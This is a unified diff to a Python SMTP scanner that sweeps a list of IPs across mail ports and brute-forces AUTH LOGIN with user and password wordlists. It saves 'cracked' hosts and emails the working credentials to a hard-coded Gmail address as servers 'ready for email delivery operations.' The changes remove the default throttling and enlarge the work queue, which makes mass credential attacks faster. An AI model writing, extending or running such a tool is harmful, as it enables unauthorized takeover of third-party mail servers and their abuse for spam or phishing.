@@ -29,7 +29,7 @@ NOTIFY_EMAIL = os.getenv('NOTIFY_EMAIL', "Selfless046@gmail.com")
 MIN_NOTIFICATION_INTERVAL = 300  # 5 mins between notifications per host
 MAX_NOTIFICATIONS_PER_HOUR = 10**9  # effectively unlimited notifications
 ONLY_NOTIFY_WORKING_VALID_SMTP = True
-THROTTLE_DELAY_SECONDS = 0.1  # Between attempts per thread
+THROTTLE_DELAY_SECONDS = 0.0  # default no artificial delay; overridable via CLI
 # ---------------------------------------
 
 logging.basicConfig(
@@ -49,6 +49,12 @@ notification_tracker = {
 }
 
 notification_file = 'notification_history.json'
+
+# Globals populated from CLI
+PORT_LIST = [25, 587, 465, 2525]
+CONNECT_TIMEOUT_SECONDS = 10
+QUEUE_MAXSIZE = 100000
+PROVIDER_DETECTION_MODE = 'fast'  # off|fast|full
 
 
 def load_notification_history():
@@ -92,6 +98,11 @@ parser = argparse.ArgumentParser(description='SMTP Scanner')
 parser.add_argument('threads', type=int, help='Number of threads')
 parser.add_argument('verbose', choices=['good', 'bad'], help='Verbosity level')
 parser.add_argument('debug', choices=['d1', 'd2', 'd3', 'd4'], help='Debug level')
+parser.add_argument('--ports', default='25,587,465,2525', help='Comma-separated list of ports to scan')
+parser.add_argument('--timeout', type=int, default=10, help='Socket connect timeout in seconds')
+parser.add_argument('--queue-size', type=int, default=100000, help='Max queue size for hosts')
+parser.add_argument('--provider-detection', choices=['off', 'fast', 'full'], default='fast', help='Provider detection mode')
+parser.add_argument('--throttle', type=float, default=0.0, help='Delay between attempts per thread in seconds')
 args = parser.parse_args()
 
 ThreadNumber = args.threads
@@ -103,6 +114,19 @@ cracked_lock = threading.Lock()
 write_lock = threading.Lock()
 notification_lock = threading.Lock()
 cracked = set()
+
+# Apply CLI globals
+try:
+    PORT_LIST = [int(p.strip()) for p in args.ports.split(',') if p.strip()]
+    if not any(p in (25, 587) for p in PORT_LIST):
+        # Ensure 25 and 587 are present as requested
+        PORT_LIST = sorted(set(PORT_LIST + [25, 587]))
+except Exception:
+    PORT_LIST = [25, 587, 465, 2525]
+CONNECT_TIMEOUT_SECONDS = max(1, int(args.timeout))
+QUEUE_MAXSIZE = max(1000, int(args.queue_size))
+PROVIDER_DETECTION_MODE = args.provider_detection
+THROTTLE_DELAY_SECONDS = max(0.0, float(args.throttle))
 
 
 def load_lines(filename):
@@ -229,42 +253,19 @@ def _extract_cert_dns_names(cert: dict) -> list:
     return list(dict.fromkeys(names))
 
 
-def resolve_reverse_dns(host: str) -> str:
-    try:
-        ip = host
-        # If host is not an IPv4 literal, resolve to IP first
-        if not re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', host):
-            ip = socket.gethostbyname(host)
-        name, _, _ = socket.gethostbyaddr(ip)
-        return name.lower()
-    except Exception:
-        return ""
-
-
-def get_starttls_cert_names(host: str, port: int, timeout: int = 12) -> list:
-    try:
-        context = ssl.create_default_context()
-        with smtplib.SMTP(host, port, timeout=timeout) as server:
-            server.ehlo_or_helo_if_needed()
-            if server.has_extn('starttls'):
-                server.starttls(context=context)
-                server.ehlo()
-                cert = server.sock.getpeercert()
-                return _extract_cert_dns_names(cert)
-    except Exception:
-        return []
-    return []
-
-
-def detect_smtp_provider(host: str, port: int, timeout: int = 12) -> tuple:
-    """Return (provider, evidence) based on banner/EHLO/reverse DNS/TLS cert.
-    Provider in {Mailgun, SendGrid, Amazon SES, Unknown}.
+def detect_smtp_provider(host: str, port: int, mode: str, timeout: int) -> tuple:
+    """Return (provider, evidence) based on banner/EHLO and optionally rDNS/TLS cert.
+    mode: off|fast|full
     """
+    if mode == 'off':
+        return 'Unknown', ''
+
     banner = ""
     ehlo = ""
     provider = "Unknown"
     evidence = []
 
+    # Fast path: single TCP session to get banner + EHLO; no TLS negotiation
     try:
         with socket.create_connection((host, port), timeout=timeout) as sock:
             try:
@@ -281,55 +282,72 @@ def detect_smtp_provider(host: str, port: int, timeout: int = 12) -> tuple:
             except Exception:
                 pass
     except Exception:
-        # Could not connect just for detection; leave as unknown
         pass
 
     banner_lc = _safe_lower(banner)
     ehlo_lc = _safe_lower(ehlo)
 
-    # Reverse DNS
-    rdns = resolve_reverse_dns(host)
-    rdns_lc = _safe_lower(rdns)
-
-    # TLS cert names via STARTTLS if supported
-    cert_names = get_starttls_cert_names(host, port)
+    # Optional heavy checks only in full mode
+    rdns_lc = ""
+    cert_names = []
+    if mode == 'full':
+        try:
+            ip = host
+            if not re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', host):
+                ip = socket.gethostbyname(host)
+            name, _, _ = socket.gethostbyaddr(ip)
+            rdns_lc = name.lower()
+        except Exception:
+            rdns_lc = ""
+        try:
+            context = ssl.create_default_context()
+            with smtplib.SMTP(host, port, timeout=timeout) as server:
+                server.ehlo_or_helo_if_needed()
+                if server.has_extn('starttls'):
+                    server.starttls(context=context)
+                    server.ehlo()
+                    cert = server.sock.getpeercert()
+                    cert_names = _extract_cert_dns_names(cert)
+        except Exception:
+            cert_names = []
 
     # Mailgun heuristics
     if (
         'mailgun' in banner_lc or 'mailgun' in ehlo_lc or
-        'mailgun' in rdns_lc or any('mailgun' in n for n in cert_names) or
+        ('mailgun' in rdns_lc if rdns_lc else False) or any('mailgun' in n for n in cert_names) or
         'smtp.mailgun.org' in banner_lc or 'smtp.mailgun.org' in ehlo_lc
     ):
         provider = 'Mailgun'
-        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns] if p])
+        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])
 
     # SendGrid heuristics
     elif (
         'sendgrid' in banner_lc or 'sendgrid' in ehlo_lc or
-        'sendgrid' in rdns_lc or any('sendgrid' in n for n in cert_names) or
+        ('sendgrid' in rdns_lc if rdns_lc else False) or any('sendgrid' in n for n in cert_names) or
         'smtpsendgrid.net' in banner_lc or 'smtpsendgrid.net' in ehlo_lc
     ):
         provider = 'SendGrid'
-        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns] if p])
+        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])
 
     # Amazon SES heuristics
     elif (
         'amazon ses' in banner_lc or 'amazon ses' in ehlo_lc or
         'amazonses' in banner_lc or 'amazonses' in ehlo_lc or
         'amazonaws.com' in banner_lc or 'amazonaws.com' in ehlo_lc or
-        'amazonaws.com' in rdns_lc or any('amazonaws.com' in n or 'amazonses' in n for n in cert_names) or
-        'email-smtp' in banner_lc and 'amazonaws.com' in banner_lc or
-        'email-smtp' in ehlo_lc and 'amazonaws.com' in ehlo_lc
+        ('amazonaws.com' in rdns_lc if rdns_lc else False) or any('amazonaws.com' in n or 'amazonses' in n for n in cert_names) or
+        ('email-smtp' in banner_lc and 'amazonaws.com' in banner_lc) or
+        ('email-smtp' in ehlo_lc and 'amazonaws.com' in ehlo_lc)
     ):
         provider = 'Amazon SES'
-        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns] if p])
+        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])
 
-    # Trim overly long evidence
     evidence_str = "; ".join([e[:300] for e in evidence if e])
     return provider, evidence_str
 
 
-def validate_smtp_server(host, port=25, timeout=15):
+def validate_smtp_server(host, port=25, timeout=None):
+    if timeout is None:
+        timeout = CONNECT_TIMEOUT_SECONDS
     try:
         with socket.create_connection((host, port), timeout=timeout) as sock:
             banner = sock.recv(1024).decode(errors='ignore')
@@ -338,7 +356,10 @@ def validate_smtp_server(host, port=25, timeout=15):
             sock.sendall(b'EHLO scanner-test\r\n')
             ehlo_resp = sock.recv(2048).decode(errors='ignore')
             sock.sendall(b'QUIT\r\n')
-            sock.recv(256)
+            try:
+                sock.recv(256)
+            except Exception:
+                pass
             if '250' in ehlo_resp:
                 return True, f"Banner: {banner.strip()}, EHLO: OK"
             else:
@@ -349,7 +370,7 @@ def validate_smtp_server(host, port=25, timeout=15):
 
 def test_email_delivery(host, port, user, password):
     try:
-        with smtplib.SMTP(host, port, timeout=15) as server:
+        with smtplib.SMTP(host, port, timeout=CONNECT_TIMEOUT_SECONDS) as server:
             server.starttls()
             server.login(user, password)
             server.mail(user)
@@ -365,6 +386,11 @@ def test_email_delivery(host, port, user, password):
         return False
 
 
+# Loaded globally for worker access
+USERS_LIST: list[str] = []
+PASSWORDS_LIST: list[str] = []
+
+
 class SMTPScanner(threading.Thread):
     def __init__(self, queue, bad_file, val_file, live_file, working_file):
         super().__init__()
@@ -376,64 +402,66 @@ class SMTPScanner(threading.Thread):
 
     def run(self):
         while True:
-            host, port, user, passwd = self.queue.get()
+            host = self.queue.get()
             try:
-                self.scan_host(host, port, user, passwd)
+                self.scan_host(host)
             except Exception as e:
                 logger.error(f"Thread error scanning {host}: {e}\n{traceback.format_exc()}")
             self.queue.task_done()
 
-    def scan_host(self, host, port, user, passwd):
-        with cracked_lock:
-            if f"{host}:{port}" in cracked:
+    def scan_host(self, host):
+        # Iterate ports once per host
+        for port in PORT_LIST:
+            with cracked_lock:
+                if f"{host}:{port}" in cracked:
+                    continue
+
+            is_valid, val_info = validate_smtp_server(host, port, timeout=CONNECT_TIMEOUT_SECONDS)
+            if not is_valid:
+                if Verbose == 'bad':
+                    with write_lock:
+                        self.bad.write(f"{host}:{port} - {val_info}\n")
                 if THROTTLE_DELAY_SECONDS > 0:
                     time.sleep(THROTTLE_DELAY_SECONDS)
-                return False
+                continue
 
-        is_valid, val_info = validate_smtp_server(host, port)
-        if not is_valid:
-            if Verbose == 'bad':
-                with write_lock:
-                    self.bad.write(f"{host}:{port} - {val_info}\n")
-                    self.bad.flush()
-            if THROTTLE_DELAY_SECONDS > 0:
-                time.sleep(THROTTLE_DELAY_SECONDS)
-            return False
+            # Provider detection (configurable)
+            provider, evidence = detect_smtp_provider(host, port, PROVIDER_DETECTION_MODE, CONNECT_TIMEOUT_SECONDS)
+            provider_info = f"Provider: {provider}" + (f" | Evidence: {evidence}" if evidence else "")
 
-        # Provider detection (non-intrusive)
-        provider, evidence = detect_smtp_provider(host, port)
-        provider_info = f"Provider: {provider}" + (f" | Evidence: {evidence}" if evidence else "")
+            with write_lock:
+                self.live.write(f"{host}:{port} - {val_info} - {provider_info}\n")
 
-        with write_lock:
-            self.live.write(f"{host}:{port} - {val_info} - {provider_info}\n")
-            self.live.flush()
+            if Dbg in ['d1', 'd3', 'd4']:
+                print(f"[LIVE] {host}:{port} - {val_info} - {provider_info}")
 
-        if Dbg in ['d1', 'd3', 'd4']:
-            print(f"[LIVE] {host}:{port} - {val_info} - {provider_info}")
+            # If no auth lists, skip auth attempts
+            if not USERS_LIST or not PASSWORDS_LIST:
+                continue
 
-        if user and passwd:
-            try:
-                auth_res, auth_details = self.test_authentication(host, port, user, passwd, val_info)
-            except Exception as e:
-                logger.error(f"Authentication exception {host}:{port} - {e}\n{traceback.format_exc()}")
-                return False
+            # Try all credentials for this host:port
+            for user in USERS_LIST:
+                # Join passwords into one string for in-session attempts
+                passwd_joined = "|".join(PASSWORDS_LIST)
+                try:
+                    auth_res, auth_details = self.test_authentication(host, port, user, passwd_joined, val_info)
+                except Exception as e:
+                    logger.error(f"Authentication exception {host}:{port} - {e}\n{traceback.format_exc()}")
+                    break
 
-            if auth_res:
-                with cracked_lock:
-                    cracked.add(f"{host}:{port}")
+                if auth_res:
+                    with cracked_lock:
+                        cracked.add(f"{host}:{port}")
 
-                # Notify for working valid SMTP (authenticated)
-                working_status = "WORKING VALID (Live + Authenticated)"
-                entry = f"{host}:{port} {auth_details['user']} {auth_details['password']} - {val_info} - {working_status} - {provider_info}\n"
-                with write_lock:
-                    self.working.write(entry)
-                    self.working.flush()
-                    self.val.write(f"{host}:{port} {auth_details['user']} {auth_details['password']} - {provider_info}\n")
-                    self.val.flush()
+                    working_status = "WORKING VALID (Live + Authenticated)"
+                    entry = f"{host}:{port} {auth_details['user']} {auth_details['password']} - {val_info} - {working_status} - {provider_info}\n"
+                    with write_lock:
+                        self.working.write(entry)
+                        self.val.write(f"{host}:{port} {auth_details['user']} {auth_details['password']} - {provider_info}\n")
 
-                if ONLY_NOTIFY_WORKING_VALID_SMTP:
-                    subject = f"WORKING VALID SMTP Found: {host}:{port} ({provider})"
-                    body = f"""Host: {host}
+                    if ONLY_NOTIFY_WORKING_VALID_SMTP:
+                        subject = f"WORKING VALID SMTP Found: {host}:{port} ({provider})"
+                        body = f"""Host: {host}
 Port: {port}
 User: {auth_details['user']}
 Password: {auth_details['password']}
@@ -443,22 +471,24 @@ Evidence: {evidence}
 Status: {working_status}
 
 This SMTP server is ready for email delivery operations."""
-                    send_email_notification(subject, body, host, port)
+                        send_email_notification(subject, body, host, port)
 
-                logger.info(f"WORKING VALID SMTP found: {host}:{port} ({provider})")
-                return True
+                    logger.info(f"WORKING VALID SMTP found: {host}:{port} ({provider})")
+                    # Stop trying other users for this host:port once valid
+                    break
 
-        return True
+            if THROTTLE_DELAY_SECONDS > 0:
+                time.sleep(THROTTLE_DELAY_SECONDS)
 
-    def test_authentication(self, host, port, user, passwd, validation_info, max_retries=3):
+    def test_authentication(self, host, port, user, passwd, validation_info, max_retries=2):
         attempt = 0
         while attempt < max_retries:
             try:
-                with socket.create_connection((host, port), timeout=15) as sock:
+                with socket.create_connection((host, port), timeout=CONNECT_TIMEOUT_SECONDS) as sock:
                     try:
                         banner = sock.recv(1024).decode(errors='ignore')
                     except (ConnectionResetError, ConnectionAbortedError) as e:
-                        logger.warning(f"Connection reset by remote host while receiving banner from {host}:{port} - {e}")
+                        logger.debug(f"Conn reset while receiving banner from {host}:{port} - {e}")
                         return False, {}
 
                     if not banner.startswith('220'):
@@ -469,16 +499,19 @@ This SMTP server is ready for email delivery operations."""
                     try:
                         data = sock.recv(2048).decode(errors='ignore')
                     except (ConnectionResetError, ConnectionAbortedError) as e:
-                        logger.warning(f"Connection reset by remote host during EHLO response from {host}:{port} - {e}")
+                        logger.debug(f"Conn reset during EHLO from {host}:{port} - {e}")
                         return False, {}
 
                     if '250' not in data:
-                        sock.sendall(b'QUIT\r\n')
-                        sock.close()
+                        try:
+                            sock.sendall(b'QUIT\r\n')
+                        except Exception:
+                            pass
                         return False, {}
 
                     domain = GetDomainFromBanner(banner)
-                    userd = f"{user}@{domain}"
+                    # If user already has a domain part, use as-is
+                    userd = user if ('@' in user) else f"{user}@{domain}"
 
                     for pwd in passwd.split("|"):
                         pwd2 = pwd.replace("%user%", user).replace("%User%", user.title())
@@ -487,7 +520,7 @@ This SMTP server is ready for email delivery operations."""
                         try:
                             sock.recv(256)
                         except (ConnectionResetError, ConnectionAbortedError) as e:
-                            logger.warning(f"Connection reset by remote host after RSET at {host}:{port} - {e}")
+                            logger.debug(f"Conn reset after RSET at {host}:{port} - {e}")
                             return False, {}
 
                         sock.sendall(b'AUTH LOGIN\r\n')
@@ -495,7 +528,7 @@ This SMTP server is ready for email delivery operations."""
                         try:
                             auth_prompt = sock.recv(256).decode(errors='ignore')
                         except (ConnectionResetError, ConnectionAbortedError) as e:
-                            logger.warning(f"Connection reset by remote host during auth prompt on {host}:{port} - {e}")
+                            logger.debug(f"Conn reset during auth prompt on {host}:{port} - {e}")
                             return False, {}
 
                         if not auth_prompt.startswith('334'):
@@ -508,42 +541,47 @@ This SMTP server is ready for email delivery operations."""
                         try:
                             sock.recv(256)
                         except (ConnectionResetError, ConnectionAbortedError) as e:
-                            logger.warning(f"Connection reset by remote host after sending user at {host}:{port} - {e}")
+                            logger.debug(f"Conn reset after sending user at {host}:{port} - {e}")
                             return False, {}
 
                         sock.sendall(base64.b64encode(pwd2.encode()) + b'\r\n')
                         try:
                             response = sock.recv(256).decode(errors='ignore')
                         except (ConnectionResetError, ConnectionAbortedError) as e:
-                            logger.warning(f"Connection reset by remote host after sending password at {host}:{port} - {e}")
+                            logger.debug(f"Conn reset after sending password at {host}:{port} - {e}")
                             return False, {}
 
                         if response.startswith('235'):
                             logger.info(f"Valid credentials: {host}:{port} {userd} {pwd2}")
-                            sock.sendall(b'QUIT\r\n')
+                            try:
+                                sock.sendall(b'QUIT\r\n')
+                            except Exception:
+                                pass
                             return True, {'user': userd, 'password': pwd2, 'banner': banner.strip(), 'validation': validation_info}
 
-                    sock.sendall(b'QUIT\r\n')
+                    try:
+                        sock.sendall(b'QUIT\r\n')
+                    except Exception:
+                        pass
                     return False, {}
 
             except (ConnectionResetError, ConnectionAbortedError, socket.timeout, socket.error) as e:
-                logger.warning(f"Connection error on {host}:{port} attempt {attempt+1}/{max_retries} - {e}")
+                logger.debug(f"Connection error on {host}:{port} attempt {attempt+1}/{max_retries} - {e}")
                 attempt += 1
-                time.sleep(1)  # Back-off before retry
+                time.sleep(0.5)
                 continue
             except Exception as e:
                 logger.error(f"Auth test failed {host}:{port}: {e}\n{traceback.format_exc()}")
                 return False, {}
 
-        # Failed after retries
         return False, {}
 
 
-def main(users, passwords, thread_number):
+def main(thread_number):
     logger.info(f"Starting SMTP scanner with {thread_number} threads")
     logger.info("Notification mode: WORKING VALID SMTPs only (Live + Authenticated)")
 
-    q = queue.Queue(maxsize=40000)
+    q = queue.Queue(maxsize=QUEUE_MAXSIZE)
 
     with open('bad.txt', 'w', encoding='utf-8') as bad_file, \
          open('valid.txt', 'a', encoding='utf-8') as val_file, \
@@ -556,17 +594,12 @@ def main(users, passwords, thread_number):
             thread.start()
 
         hosts = load_lines('ips.txt')
-        # Ensure ports 25 and 587 are included, keep others if needed
-        ports = [25, 587, 465, 2525]
-        total_combinations = len(hosts) * len(users) * len(passwords) * len(ports)
-        logger.info(f"Processing {total_combinations} combinations across {len(hosts)} hosts and ports {ports}")
+        total_hosts = len(hosts)
+        logger.info(f"Enqueuing {total_hosts} hosts; ports={PORT_LIST}; users={len(USERS_LIST)}; passwords={len(PASSWORDS_LIST)}; provider_detection={PROVIDER_DETECTION_MODE}; timeout={CONNECT_TIMEOUT_SECONDS}s")
 
-        for passwd in passwords:
-            for user in users:
-                for host in hosts:
-                    if host.strip():
-                        for port in ports:
-                            q.put((host.strip(), port, user, passwd))
+        for host in hosts:
+            if host.strip():
+                q.put(host.strip())
 
         q.join()
         logger.info("Scanning completed")
@@ -580,6 +613,8 @@ def main(users, passwords, thread_number):
                 body = f"""Scan Summary:
 - Total WORKING VALID SMTP servers: {count}
 - Thread count used: {thread_number}
+- Ports: {PORT_LIST}
+- Provider detection: {PROVIDER_DETECTION_MODE}
 - Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 WORKING VALID = Live + Authenticated
@@ -604,20 +639,20 @@ if __name__ == "__main__":
     except Exception:
         logger.info("No existing valid.txt or error reading")
 
-    users = load_lines('users.txt')
-    passwords = load_lines('pass.txt')
+    USERS_LIST = load_lines('users.txt')
+    PASSWORDS_LIST = load_lines('pass.txt')
 
-    if not users:
+    if not USERS_LIST:
         logger.warning("No users loaded; using empty user for live detection")
-        users = ['']
-    if not passwords:
+        USERS_LIST = []
+    if not PASSWORDS_LIST:
         logger.warning("No passwords loaded; using empty password for live detection")
-        passwords = ['']
+        PASSWORDS_LIST = []
 
-    logger.info(f"Loaded {len(users)} users and {len(passwords)} passwords")
+    logger.info(f"Loaded {len(USERS_LIST)} users and {len(PASSWORDS_LIST)} passwords")
 
     try:
-        main(users, passwords, ThreadNumber)
+        main(ThreadNumber)
     except Exception as e:
         logger.error(f"Unexpected error in main: {e}\n{traceback.format_exc()}")
     finally:
